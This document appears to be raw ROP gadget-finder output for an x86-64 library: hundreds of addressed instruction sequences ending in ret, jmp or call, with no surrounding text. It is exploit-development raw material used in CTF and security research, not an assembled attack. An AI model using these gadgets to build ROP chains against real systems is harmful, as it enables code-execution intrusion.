0x00002aaaaab5d9da : adc eax, 0x33a579 ; mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaab5d722 : adc eax, 0x33a831 ; mov qword ptr [rsp + 8], rax ; call qword ptr [rdx]
0x00002aaaaab5d66a : adc eax, 0x33a8e9 ; mov qword ptr [rsp + 8], rax ; call qword ptr [rdx]
0x00002aaaaab5caf1 : adc eax, 0x33dd22 ; add rsp, 0x18 ; ret
0x00002aaaaac0b792 : adc eax, 0x3609 ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab0b8ad : adc eax, 0x38c7d6 ; ret
0x00002aaaaab03196 : adc eax, 0x394d95 ; mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaab01ae9 : adc eax, 0x397faf ; ret
0x00002aaaaaaf4929 : adc eax, 0x3a89da ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaab8006a : adc eax, 0x3b30478b ; xor byte ptr [rbp + 0x3d], r14b ; ret
0x00002aaaaabea6fc : adc eax, 0x4003f ; cmove rax, rdx ; ret
0x00002aaaaabca3a7 : adc eax, 0x48000000 ; add esp, 0x18 ; ret
0x00002aaaaac085dd : adc eax, 0x48ffffff ; mov edi, ebp ; call rax
0x00002aaaaab09ab6 : adc eax, 0x540f6600 ; ret 0xf66
0x00002aaaaab09cdc : adc eax, 0x590ff300 ; enter 0x280f, -0x3f ; ret
0x00002aaaaab7ac58 : adc eax, 0x621850f ; add byte ptr [rax], al ; ret
0x00002aaaaac2829a : adc eax, 0x63490004 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ff5a : adc eax, 0x63b078b ; jne 0xab0bb ; ret
0x00002aaaaab7c36c : adc eax, 0x71d850f ; add byte ptr [rax], al ; ret
0x00002aaaaac6fda5 : adc eax, 0x77440001 ; std ; call rsp
0x00002aaaaabca7a8 : adc eax, 0x801f0f ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabf801a : adc eax, 0x8303eec1 ; out dx, al ; add dword ptr [rax - 0x78], eax ; ja 0x123031 ; ret
0x00002aaaaac1b411 : adc eax, 0x83480000 ; ret 0xe910
0x00002aaaaaaf84fd : adc eax, 0x83489066 ; ret
0x00002aaaaac144bd : adc eax, 0x8348fffc ; clc ; dec dword ptr [rax - 0x77] ; ret 0x840f
0x00002aaaaabdd1ed : adc eax, 0x8548fff3 ; sal byte ptr [rsp + rdx + 0x48], 0x89 ; ret
0x00002aaaaab40cbd : adc eax, 0x894c0000 ; loop 0x6bc59 ; or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaabc6550 : adc eax, 0x985f3 ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaabb6415 : adc eax, 0xa7fea ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab8776f : adc eax, 0xba000dd0 ; outsb dx, byte ptr [rsi] ; add eax, dword ptr [rax] ; add al, ch ; ret
0x00002aaaaab12249 : adc eax, 0xc1834900 ; add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaab635e7 : adc eax, 0xc7164 ; cmove rax, rdx ; ret
0x00002aaaaac8144d : adc eax, 0xd500001 ; hlt ; jmp rcx
0x00002aaaaac00f8e : adc eax, 0xde0d ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab8036a : adc eax, 0xe180d188 ; pcmpeqb mm3, qword ptr [rsi] ; ret
0x00002aaaaac283e4 : adc eax, dword ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab43511 : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x38b
0x00002aaaaab95d4f : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac1f05e : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1d619 : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaaae3458 : adc eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x16
0x00002aaaaaade1ba : adc eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab20600 : adc eax, dword ptr [rax] ; movsxd rax, dword ptr [rax + rdx*4] ; add rax, rdi ; jmp rax
0x00002aaaaabcfe6c : adc eax, dword ptr [rbx + 0x1674a1f8] ; neg eax ; pop rbx ; ret
0x00002aaaaac812c5 : adc eax, dword ptr [rcx] ; add byte ptr [rax], cl ; fcomi st(3) ; call qword ptr [rdi]
0x00002aaaaabf26f3 : adc eax, dword ptr [rdi] ; add byte ptr [rax - 0x77], cl ; ret 0xff31
0x00002aaaaab76fab : adc eax, dword ptr [rdx] ; mov al, byte ptr [rcx + 8] ; mov byte ptr [rdx + 8], al ; mov rax, rdi ; ret
0x00002aaaaab76feb : adc eax, dword ptr [rdx] ; mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x00002aaaaab7700b : adc eax, dword ptr [rdx] ; mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x00002aaaaab76e68 : adc eax, dword ptr [rdx] ; mov rax, rdi ; ret
0x00002aaaaab76eba : adc eax, dword ptr [rdx] ; movlpd qword ptr [rdx + 8], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab79c3c : adc eax, dword ptr [rdx] ; xor ah, ah ; mov byte ptr [rdx + 8], ah ; mov rax, rdi ; ret
0x00002aaaaac20a4f : adc eax, dword ptr cs:[rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab1d2f9 : adc eax, eax ; ret
0x00002aaaaac074ac : adc eax, edi ; add eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab1d436 : adc eax, edx ; pop rbp ; pop rbx ; ret
0x00002aaaaac581e5 : adc ebp, dword ptr [rbx] ; fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x00002aaaaac76cb9 : adc ebp, ebp ; call rsi
0x00002aaaaabecab0 : adc ebp, ebx ; ret 0x1f0f
0x00002aaaaabff430 : adc ebp, ebx ; sub eax, 0x441f0f ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab5db24 : adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaabdf1bc : adc ebx, eax ; nop ; mov eax, edi ; ret
0x00002aaaaac11ace : adc ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaab7ac11 : adc ecx, dword ptr [rax - 0x73] ; jg 0xa5c34 ; jne 0xa628b ; ret
0x00002aaaaab7c305 : adc ecx, dword ptr [rax - 0x73] ; jg 0xa7328 ; jne 0xa7a9b ; ret
0x00002aaaaab01b2b : adc ecx, dword ptr [rax - 0x75] ; cli ; ret
0x00002aaaaab50a4a : adc ecx, dword ptr [rax - 0x7b] ; push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x00002aaaaaaf9301 : adc ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab6debd : adc ecx, dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaab80a54 : adc ecx, dword ptr [rax - 0x7d] ; ret 0x8b04
0x00002aaaaabb8375 : adc ecx, dword ptr [rbp + 0xf049044] ; xchg eax, esp ; ret 0x9848
0x00002aaaaab82129 : adc ecx, dword ptr [rcx - 0x77] ; ret 0x8b8
0x00002aaaaac02290 : adc ecx, dword ptr [rdi] ; mov dh, 0x40 ; or dh, dh ; ret 0x8802
0x00002aaaaab77034 : adc ecx, dword ptr [rdx + 5] ; mov rax, rdi ; ret
0x00002aaaaab77054 : adc ecx, dword ptr [rdx + 6] ; mov rax, rdi ; ret
0x00002aaaaab77074 : adc ecx, dword ptr [rdx + 7] ; mov rax, rdi ; ret
0x00002aaaaab76ebe : adc ecx, dword ptr [rdx + 8] ; mov rax, rdi ; ret
0x00002aaaaab79ca5 : adc ecx, dword ptr [rdx + 8] ; xor ah, ah ; mov byte ptr [rdx + 0x10], ah ; mov rax, rdi ; ret
0x00002aaaaabb02fa : adc ecx, edx ; call 0x42d03c47
0x00002aaaaabb034a : adc ecx, edx ; call 0x43d03c97
0x00002aaaaab50a61 : adc edi, dword ptr [rax + 1] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac10959 : adc edi, dword ptr [rsi + 0xc7ffff] ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac6e7f1 : adc edi, eax ; call rsp
0x00002aaaaac6def9 : adc edi, esi ; jmp rsp
0x00002aaaaac69b19 : adc edi, esp ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaabab3a9 : adc edx, ebp ; sti ; lcall ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaab1d2f1 : adc edx, ebx ; mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaac596fe : adc esi, dword ptr [rbp - 0x60001a67] ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaac6df49 : adc esi, edi ; call rsp
0x00002aaaaac7efe1 : adc esi, edx ; jmp qword ptr [rcx]
0x00002aaaaab43e5a : adc esi, esi ; ret 0xf20
0x00002aaaaab28f67 : adc qword ptr [r11], 0x440f4c00 ; ret 0xf4c
0x00002aaaaac20c32 : adc qword ptr [r8], rax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab742cf : adc qword ptr [rcx + 6], rsi ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00002aaaaab742d6 : adc qword ptr [rcx + 7], rdi ; ret
0x00002aaaaab73f71 : adc qword ptr [rcx - 1], rbx ; ret
0x00002aaaaab73f35 : adc qword ptr [rcx - 1], rdi ; ret
0x00002aaaaab73f6a : adc qword ptr [rcx - 2], rdx ; vmovups zmmword ptr [r9 - 0x40], zmm3 ; ret
0x00002aaaaab74168 : adc qword ptr [rcx - 2], rsi ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x00002aaaaab73f2e : adc qword ptr [rcx - 2], rsi ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00002aaaaab74431 : adc qword ptr [rdi - 7], rsi ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab74438 : adc qword ptr [rdi - 8], rdi ; ret
0x00002aaaaab7ea0b : adc qword ptr [rdi], rdx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x00002aaaaab7eb37 : adc qword ptr [rsi + 2], rdx ; vmovups zmmword ptr [rsi + 0xc0], zmm2 ; ret
0x00002aaaaab7eb3e : adc qword ptr [rsi + 3], rdx ; ret
0x00002aaaaab7ebd4 : adc qword ptr [rsi + 6], rdx ; vmovups zmmword ptr [rsi + 0x1c0], zmm2 ; ret
0x00002aaaaab7ebdb : adc qword ptr [rsi + 7], rdx ; ret
0x00002aaaaab7e9dd : adc qword ptr [rsi - 1], rdx ; ret
0x00002aaaaab7e9d6 : adc qword ptr [rsi - 2], rdx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x00002aaaaab1d2f0 : adc r10, r11 ; mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaab636d3 : adc r11b, r14b ; movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x00002aaaaac6b200 : adc r13b, dl ; dec esp ; add byte ptr [rax], 0 ; xchg eax, esp ; adc ch, dl ; jmp rsp
0x00002aaaaab43510 : adc r8, qword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x38b
0x00002aaaaac1d780 : adc r8b, byte ptr [r8] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab1d435 : adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00002aaaaab6375f : adc sil, r15b ; ret
0x00002aaaaac8121b : add ah, ah ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], dl ; jmp qword ptr [rcx]
0x00002aaaaac9051b : add ah, ah ; add eax, 0x74000002 ; clc ; call qword ptr [rdi]
0x00002aaaaac6ca27 : add ah, ah ; je 0x197a20 ; jmp rsp
0x00002aaaaac6cec7 : add ah, ah ; jmp rsp
0x00002aaaaac7ba1b : add ah, ah ; mov edx, 0x75d00000 ; out dx, eax ; jmp qword ptr [rax]
0x00002aaaaac6d68f : add ah, ah ; or al, 0xf6 ; call rsp
0x00002aaaaac8ef1b : add ah, ah ; out dx, eax ; add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac7ca1b : add ah, ah ; retf 0 ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac6fb4f : add ah, ah ; salc ; cli ; call rsp
0x00002aaaaac84efb : add ah, al ; add qword ptr [r8], r8 ; adc byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac6d1bf : add ah, al ; and ah, dh ; call rsp
0x00002aaaaac81ffb : add ah, al ; and byte ptr [rcx], al ; add al, dh ; xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f4fb : add ah, al ; cmc ; add byte ptr [rax], al ; add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac6d387 : add ah, al ; cmc ; jmp rsp
0x00002aaaaac73afb : add ah, al ; cmp eax, dword ptr [rax] ; add al, ah ; xor al, 0xea ; jmp rax
0x00002aaaaac7d8fb : add ah, al ; fld dword ptr [rax] ; add byte ptr [rax + 0x30], ah ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac7ff10 : add ah, al ; jmp qword ptr [rdi]
0x00002aaaaac86ffb : add ah, al ; jo 0x1b2008 ; add al, ah ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac89efb : add ah, al ; lahf ; add dword ptr [rax], eax ; and bl, 0xf6 ; jmp qword ptr [rdi]
0x00002aaaaac6fdcf : add ah, al ; mov esp, 0x2ba4fffd ; add dword ptr [rax], eax ; hlt ; ret 0xfffd
0x00002aaaaac6dd2f : add ah, al ; out 0xf6, al ; call rsp
0x00002aaaaac6fc97 : add ah, al ; sti ; call rsp
0x00002aaaaac832fb : add ah, al ; xor eax, dword ptr [rcx] ; add byte ptr [rax - 0x17], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81233 : add ah, bh ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac755ab : add ah, bh ; add byte ptr [rax], al ; add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaab7f06e : add ah, bh ; add eax, dword ptr [rax] ; pop rbx ; ret
0x00002aaaaab7f08e : add ah, bh ; add eax, dword ptr [rax] ; ret
0x00002aaaaac84d33 : add ah, bh ; add qword ptr [r8], r8 ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84c33 : add ah, bh ; add qword ptr [rax], r8 ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac84a33 : add ah, bh ; add qword ptr [rax], rax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac698f5 : add ah, bh ; call qword ptr [rax]
0x00002aaaaac69811 : add ah, bh ; call rax
0x00002aaaaac697d1 : add ah, bh ; inc dword ptr [rax] ; add bh, ah ; jmp rax
0x00002aaaaab7f126 : add ah, bh ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab7f04d : add ah, bh ; inc dword ptr [rbx] ; pop rbx ; ret
0x00002aaaaac85033 : add ah, bh ; push rax ; add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac697f1 : add ah, bh ; push rax ; add esp, edi ; call rax
0x00002aaaaac85333 : add ah, bh ; push rbx ; add dword ptr [rax], eax ; js 0x1b03b8 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac86a60 : add ah, bh ; ret
0x00002aaaaac6994c : add ah, bh ; sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac74f13 : add ah, bl ; add byte ptr [r8], r8b ; pop rdi ; jmp 0x19ff23
0x00002aaaaac84113 : add ah, bl ; add dword ptr [r8], eax ; call 0x241ae64d
0x00002aaaaac84f13 : add ah, bl ; add qword ptr [r8], r8 ; sub byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac82013 : add ah, bl ; and byte ptr [rcx], al ; add byte ptr [rax], cl ; xchg eax, esp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f513 : add ah, bl ; cmc ; add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83913 : add ah, bl ; cmp dword ptr [rcx], eax ; add byte ptr [rax], bl ; add esi, ebp ; call qword ptr [rdi]
0x00002aaaaac83d13 : add ah, bl ; cmp eax, 0x1e380001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac87013 : add ah, bl ; jo 0x1b2020 ; add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac78a13 : add ah, bl ; mov al, byte ptr [rax] ; add al, ch ; jg 0x1a3a10 ; call qword ptr [rcx]
0x00002aaaaac783e7 : add ah, byte ptr [rbx + 0x41180e0a] ; ret
0x00002aaaaac785b8 : add ah, byte ptr [rdx + 0x41280e0a] ; ret
0x00002aaaaab7eb3a : add ah, byte ptr [rdx - 0xf] ; jl 0xa9b8f ; adc dword ptr [rsi + 3], edx ; ret
0x00002aaaaac69c14 : add ah, byte ptr [rdx - 4] ; call qword ptr [rdx + 0x22fffc61]
0x00002aaaaab76ebb : add ah, byte ptr [rsi + 0xf] ; adc ecx, dword ptr [rdx + 8] ; mov rax, rdi ; ret
0x00002aaaaab76ee4 : add ah, byte ptr [rsi - 0x75] ; add dword ptr [rsi - 0x77], esp ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaac81123 : add ah, ch ; adc dword ptr [rcx], eax ; add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaac84e23 : add ah, ch ; add qword ptr [rax], r8 ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac86f23 : add ah, ch ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac78f23 : add ah, ch ; pop qword ptr [rax] ; add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaac85623 : add ah, ch ; push rsi ; add dword ptr [rax], eax ; js 0x1b06ad ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac71c23 : add ah, ch ; sbb al, 0 ; add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaac8fd23 : add ah, ch ; std ; add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac7ab23 : add ah, ch ; stosd dword ptr [rdi], eax ; add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac88003 : add ah, cl ; add byte ptr [rcx], 0 ; cmp byte ptr [rbx - 0xa], cl ; call qword ptr [rax]
0x00002aaaaac84503 : add ah, cl ; add dword ptr [r8], r8d ; pop rax ; cmc ; jmp rax
0x00002aaaaac84c03 : add ah, cl ; add qword ptr [rax], r8 ; sbb byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac7d803 : add ah, cl ; fadd dword ptr [rax] ; add byte ptr [rax + 0x25], bh ; int1 ; call qword ptr [rcx]
0x00002aaaaac7e503 : add ah, cl ; in eax, 0 ; add byte ptr [rax - 0x17], bl ; int1 ; jmp qword ptr [rdi]
0x00002aaaaac7b103 : add ah, cl ; mov cl, 0 ; add byte ptr [rax - 0x23], ch ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaac85003 : add ah, cl ; push rax ; add dword ptr [rax], eax ; jno 0x1b0008 ; jmp qword ptr [rcx]
0x00002aaaaac72803 : add ah, cl ; sub byte ptr [rax], al ; add byte ptr [rax], bl ; xchg cl, ch ; jmp qword ptr [rcx]
0x00002aaaaac7f603 : add ah, cl ; test byte ptr [rax], 0 ; cmp byte ptr [rdx], ch ; jmp qword ptr [rdi]
0x00002aaaaac83003 : add ah, cl ; xor byte ptr [rcx], al ; add byte ptr [rax - 0x1d], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8472b : add ah, dh ; add dword ptr [r8], r8d ; loopne 0x1af78d ; cmc ; call qword ptr [rdx]
0x00002aaaaac82e2b : add ah, dh ; add dword ptr cs:[rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac8362b : add ah, dh ; add dword ptr ss:[rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84f2b : add ah, dh ; add qword ptr [r8], r8 ; jo 0x1aff30 ; jmp qword ptr [rcx]
0x00002aaaaac6f59f : add ah, dh ; cli ; jmp rsp
0x00002aaaaac7f52b : add ah, dh ; cmc ; add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83d2b : add ah, dh ; cmp eax, 0x1e500001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6ee3f : add ah, dh ; cmp edi, ecx ; jmp rsp
0x00002aaaaac6c2af : add ah, dh ; fldz ; call rsp
0x00002aaaaac6c8df : add ah, dh ; int1 ; call rsp
0x00002aaaaac8702b : add ah, dh ; jo 0x1b2038 ; add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7ac2b : add ah, dh ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; push rax ; jle 0x1a5c29 ; jmp qword ptr [rcx]
0x00002aaaaac6f74f : add ah, dh ; push rdi ; cli ; jmp rsp
0x00002aaaaac6fdd7 : add ah, dh ; ret 0xfffd
0x00002aaaaac74b0b : add ah, dl ; add byte ptr [r8], al ; adc byte ptr [rbx], dh ; jmp 0x19fb1b
0x00002aaaaac75883 : add ah, dl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x30], bl ; in al, dx ; jmp rbx
0x00002aaaaac7240b : add ah, dl ; and al, 0 ; add byte ptr [rax], al ; jle 0x19d404 ; jmp qword ptr [rsi]
0x00002aaaaac7f40b : add ah, dl ; hlt ; add byte ptr [rax], al ; shl byte ptr [rdx], 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac6e517 : add ah, dl ; in al, -9 ; jmp qword ptr [rbx + rax*8]
0x00002aaaaac6f8a7 : add ah, dl ; jg 0x19a8a9 ; call rsp
0x00002aaaaac6c217 : add ah, dl ; jl 0x19720d ; jmp rsp
0x00002aaaaac6f0e7 : add ah, dl ; mov bh, cl ; call rsp
0x00002aaaaac6dc5f : add ah, dl ; mov bl, 0xf6 ; jmp rsp
0x00002aaaaac6c59f : add ah, dl ; mov ebp, edi ; jmp rsp
0x00002aaaaac6bd6f : add ah, dl ; or esi, ebp ; call rsp
0x00002aaaaac6c0c7 : add ah, dl ; out dx, al ; call rsp
0x00002aaaaac6f7ff : add ah, dl ; pop rbp ; cli ; call rsp
0x00002aaaaac8510b : add ah, dl ; push rcx ; add dword ptr [rax], eax ; loopne 0x1b018c ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81c0b : add ah, dl ; sbb al, 1 ; add al, ah ; stc ; call qword ptr [rax]
0x00002aaaaac82c0b : add ah, dl ; sub al, 1 ; add byte ptr [rax], ah ; fcomi st(4) ; call qword ptr [rbx]
0x00002aaaaac6bc37 : add ah, dl ; xlatb ; in eax, dx ; inc esp ; ret 0
0x00002aaaaac1111c : add al, 0 ; add al, ch ; in al, dx ; xor al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab202d8 : add al, 0 ; add byte ptr [rax + 0x63], cl ; ret
0x00002aaaaab269d6 : add al, 0 ; add byte ptr [rax - 0x3f7cb7f0], cl ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaabc5713 : add al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab1c463 : add al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x2948
0x00002aaaaabfb4e1 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabf6940 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4104
0x00002aaaaac199cd : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1e519 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac199f1 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac17e3f : add al, 0 ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaac067f2 : add al, 0 ; add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x00002aaaaaae0320 : add al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x4f
0x00002aaaaabd7aa2 : add al, 0 ; add byte ptr [rax], al ; mov esi, 1 ; call rbx
0x00002aaaaab803f3 : add al, 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab0f269 : add al, 0 ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabacbdc : add al, 0 ; add byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaac08ecb : add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab3f96f : add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac91499 : add al, 0 ; add byte ptr [rbx + 1], al ; add byte ptr [rax], al ; ret
0x00002aaaaaafbe51 : add al, 0 ; add byte ptr [rcx - 0x73], cl ; add dword ptr [r8 + 0x39], r9d ; ret
0x00002aaaaab3b2b5 : add al, 0 ; add byte ptr [rcx - 0x77], cl ; ret 0x34c
0x00002aaaaab5536f : add al, 0 ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaabe32f5 : add al, 0 ; add byte ptr [rdx], al ; call rax
0x00002aaaaab15f83 : add al, 0 ; add cl, ch ; ret 0xffec
0x00002aaaaab53e06 : add al, 0 ; add dh, dh ; ret
0x00002aaaaabf6d93 : add al, 0 ; add dh, dh ; ret 0xf04
0x00002aaaaab9cbe8 : add al, 0 ; add rsp, 0x80 ; pop rbx ; ret
0x00002aaaaabea6ff : add al, 0 ; cmove rax, rdx ; ret
0x00002aaaaab72ee4 : add al, 0 ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaaba0490 : add al, 0 ; mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac169b8 : add al, 0 ; mov edx, 0x190 ; call 0x2dc49
0x00002aaaaab72e54 : add al, 0 ; mov rax, rdi ; ret
0x00002aaaaac25429 : add al, 0 ; movsxd r9, dword ptr [r11 + r9*4] ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x00002aaaaac254fd : add al, 0 ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab1aafa : add al, 0x10 ; add bl, dh ; ret
0x00002aaaaac04750 : add al, 0x10 ; mov byte ptr [rdi + 7], al ; ret
0x00002aaaaab02a69 : add al, 0x10 ; ret
0x00002aaaaabdf0e5 : add al, 0x10 ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaabdf1bb : add al, 0x11 ; ret
0x00002aaaaab7f0bd : add al, 0x12 ; pop rbx ; and eax, 0x7ff80000 ; ret
0x00002aaaaab23619 : add al, 0x13 ; add byte ptr [rax], al ; add rax, rsi ; jmp rax
0x00002aaaaac19c5b : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg ah, bl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1984b : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg ah, ch ; add eax, 0x83480000 ; ret 0xeb10
0x00002aaaaac19357 : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg al, ah ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac19b67 : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg al, dl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac195db : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1991b : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax - 0x7cb80000], bl ; ret 0xeb10
0x00002aaaaac19c37 : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], al ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac19d07 : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
